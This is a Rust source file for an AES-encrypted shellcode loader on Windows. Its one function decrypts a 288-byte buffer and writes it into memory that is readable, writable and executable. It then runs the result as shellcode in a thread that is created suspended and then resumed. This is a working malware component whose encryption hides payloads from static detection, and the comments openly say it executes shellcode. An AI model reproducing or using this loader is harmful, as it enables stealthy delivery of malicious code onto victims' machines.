
use libaes::Cipher;
use log::debug;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winbase::INFINITE; //for using aes cipher 
use std::ptr::null_mut; //This is for the memory allocation of null bytes that is also mutable in nature

use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::{CreateThread,ResumeThread};
use winapi::um::synchapi::WaitForSingleObject;


//this defines the argument to be the length 288 buffer of bytes or the u8 characters
pub fn aes_execute(enc:[u8;288],key:[u8;32],iv:[u8;16]){
    let cipher = Cipher::new_256(&key);
    //this makes the instance of the Cipher class inside Rust.

    let dec = cipher.cbc_decrypt(&iv,&enc);
    //IT WILL TAKE THE KEY WHILE MAKING THE INSTANCE AND THEN IT WILL TAKE THE IV AND THE ENCRYPTED BUFFER IN THE ARGUMENT PASSING AT THE SECOND STATEMENT.
    
    //Now we just allocate the shellcode and execute the thread using createthread api function
    unsafe{
        let address = VirtualAlloc(
            null_mut(),
            dec.len(),
            0x1000|0x2000, //This is mem_commit and mem_reserve
            0x40,
        );
        //This will create a suspended memory allocation inside the process.

        if address.is_null(){
            panic!("Failed to allocate the memory: {}",GetLastError()); //This fn is used to get the errors inside the windows api functions speicifically.
        }

        std::ptr::copy(dec.as_ptr(),address as *mut u8,dec.len());
        //source,destination,length
        //writing the shellcode at the address

        let hThread = CreateThread(
            null_mut(),
            0,
            std::mem::transmute(address),
            null_mut(),
            0x4, //create a suspended thread
            null_mut(),
        );

        if hThread.is_null(){
            panic!("Failed to create the thread: {:?}",GetLastError());
        }

        ResumeThread(hThread);
        //As the thread was in suspended state now it will execute its functions
        println!("Executing the decrypted shellcode ..");

        WaitForSingleObject(hThread,INFINITE);
        //Make the main thread stop until the execution of this shellcode thread is not finished.
        CloseHandle(hThread);
        }
}


